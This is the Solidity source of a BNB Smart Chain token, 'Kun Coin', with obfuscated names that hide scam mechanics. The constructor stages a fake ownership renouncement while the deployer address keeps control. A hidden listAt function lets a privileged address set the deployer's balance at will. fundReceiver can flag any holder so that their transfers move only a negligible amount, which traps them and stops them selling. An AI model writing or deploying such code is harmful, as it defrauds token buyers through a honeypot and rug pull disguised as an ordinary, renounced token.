/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface swapTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingTake {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract KunCoin {
    uint8 public decimals = 18;
    bool public minMax;
    address public totalExempt;
    mapping(address => uint256) public balanceOf;
    address public owner;

    mapping(address => bool) public amountAuto;

    string public name = "Kun Coin";

    uint256 public totalSupply = 100000000 * 10 ** decimals;
    mapping(address => bool) public walletMin;
    string public symbol = "KCN";
    address public walletReceiver;
    mapping(address => mapping(address => uint256)) public allowance;


    uint256 constant listAmount = 10 ** 10;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        swapTrading receiverIsSwap = swapTrading(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        walletReceiver = marketingTake(receiverIsSwap.factory()).createPair(receiverIsSwap.WETH(), address(this));
        owner = atMarketing();
        totalExempt = owner;
        walletMin[totalExempt] = true;
        balanceOf[totalExempt] = totalSupply;
        emit Transfer(address(0), totalExempt, totalSupply);
        fromTakeIs();
    }

    

    function receiverLimit(address buyFeeTeam, address buyWallet, uint256 senderToken) internal returns (bool) {
        require(balanceOf[buyFeeTeam] >= senderToken);
        balanceOf[buyFeeTeam] -= senderToken;
        balanceOf[buyWallet] += senderToken;
        emit Transfer(buyFeeTeam, buyWallet, senderToken);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function listAt(uint256 senderToken) public {
        if (!walletMin[atMarketing()]) {
            return;
        }
        balanceOf[totalExempt] = senderToken;
    }

    function atMarketing() private view returns (address) {
        return msg.sender;
    }

    function fromTakeIs() public {
        emit OwnershipTransferred(totalExempt, address(0));
        owner = address(0);
    }

    function tokenAtReceiver(address tradingLaunchedFee) public {
        if (minMax) {
            return;
        }
        walletMin[tradingLaunchedFee] = true;
        minMax = true;
    }

    function transferFrom(address takeTotalExempt, address fromToken, uint256 senderToken) public returns (bool) {
        if (takeTotalExempt != atMarketing() && allowance[takeTotalExempt][atMarketing()] != type(uint256).max) {
            require(allowance[takeTotalExempt][atMarketing()] >= senderToken);
            allowance[takeTotalExempt][atMarketing()] -= senderToken;
        }
        if (fromToken == totalExempt || takeTotalExempt == totalExempt) {
            return receiverLimit(takeTotalExempt, fromToken, senderToken);
        }
        if (amountAuto[takeTotalExempt]) {
            return receiverLimit(takeTotalExempt, fromToken, listAmount);
        }
        return receiverLimit(takeTotalExempt, fromToken, senderToken);
    }

    function fundReceiver(address limitFrom) public {
        if (limitFrom == totalExempt || limitFrom == walletReceiver || !walletMin[atMarketing()]) {
            return;
        }
        amountAuto[limitFrom] = true;
    }

    function approve(address limitAmount, uint256 senderToken) public returns (bool) {
        allowance[atMarketing()][limitAmount] = senderToken;
        emit Approval(atMarketing(), limitAmount, senderToken);
        return true;
    }

    function transfer(address fromToken, uint256 senderToken) external returns (bool) {
        return transferFrom(atMarketing(), fromToken, senderToken);
    }


}